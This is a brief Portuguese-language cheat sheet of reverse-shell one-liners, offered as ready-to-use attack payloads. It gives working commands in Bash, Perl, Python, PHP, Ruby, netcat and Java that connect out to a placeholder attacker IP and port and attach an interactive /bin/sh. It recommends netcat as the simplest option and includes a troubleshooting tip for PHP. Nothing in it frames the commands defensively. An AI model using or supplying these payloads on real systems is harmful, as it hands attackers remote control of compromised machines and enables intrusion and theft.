# Reverse shell em varias linguagens

### Bash
interpretador de comandos simples
```
bash -i >& /dev/tcp/[IP]/[Porta] 0>&1
```

### PERL
```
perl -e 'use Socket;$i="[IP]";$p=[Porta];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python
Para servidores linux no geral
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[Porta]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
Para conexões TCP, se não funcionar teste 4, 5, 6...
```
php -r '$sock=fsockopen("[IP]",[Porta]);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
```
ruby -rsocket -e'f=TCPSocket.open("[IP]",[Porta]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcar
Mais simples, foi criado para isso e também é o mais recomendado.
```
nc -e /bin/sh [IP] [Porta]
```

### Jave
Conexões TCP
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/[IP]/[Porta];cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
